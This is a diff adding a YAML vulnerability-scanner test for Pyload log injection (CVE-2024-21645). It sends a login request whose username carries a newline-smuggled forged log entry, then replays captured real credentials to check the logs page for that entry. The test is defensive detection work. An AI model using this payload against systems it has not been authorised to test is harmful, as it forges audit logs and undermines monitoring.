@@ -1,0 +1,115 @@
+id: PYLOAD_LOG_INJECTION
+info:
+  name: "Pyload Flask Log Injection"
+  description: "This test refers to a vulnerability in Pyload's Flask application where malicious inputs can be injected into the application's log files. This can occur if the application fails to properly sanitize log inputs, allowing attackers to manipulate log entries or execute arbitrary code. Exploiting this flaw can lead to information disclosure or further security breaches." 
+  details: "This vulnerability arises when the Flask-based Pyload application inadequately sanitizes user inputs before logging them. This lack of proper input validation can let attackers inject malicious data into log files, which may result in the execution of arbitrary code or the disclosure of sensitive information. Such log manipulation can compromise the application's integrity and security."
+  impact: "The impact of this vulnerability includes potential arbitrary code execution and information disclosure. Attackers can exploit this flaw to inject malicious payloads into log files, which may lead to system compromise or unauthorized access to sensitive data. Additionally, manipulated logs can disrupt monitoring and analysis processes, further jeopardizing system security."
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: PYLOAD_LOG_INJECTION
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2024-21645
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    contains_either:
+      - login
+  and:
+    - request_payload:
+        for_one:
+          key:
+            regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
+            extract: userKey
+          value:
+            extract: userVal
+    - request_payload:
+        for_one:
+          key:
+            regex: "password"
+            extract: passKey
+          value:
+            extract: passVal
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: content-type
+        extract: contentTypeHeader  
+execute:
+  type: multiple
+  requests:
+  - req: 
+    - modify_method: POST
+    - modify_url: ${urlVar}?next=${urlVar}
+    - follow_redirect: true
+    - modify_header:
+        contentTypeHeader: "application/x-www-form-urlencoded"
+    - replace_body: !!str do=login&username=abcdef\'%0a[1970-01-01 00:00:00]  INJECTED               abcd  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login
+    - validate:
+        response_payload:
+          length:
+            gt: 0
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_method: POST
+    - modify_url: ${urlVar}?next=${urlVar}/logs
+    - follow_redirect: true
+    - modify_header:
+        contentTypeHeader: "application/x-www-form-urlencoded"
+    - replace_body: 'do=login&username=${userVal}&password=${passVal}&submit=Login'  
+    - validate:
+        response_payload:
+          contains_all:
+            - "<td>1970-01-01 00:00:00</td><td class=\"loglevel\">INJECTED</td><td class=\"logsource\">abcd</td><td>THIS&nbsp;ENTRY&nbsp;HAS&nbsp;BEEN&nbsp;INJECTED&#39;</td>"
+        response_code:
+          eq: 200
+    - success: vulnerable
+    - failure: exit
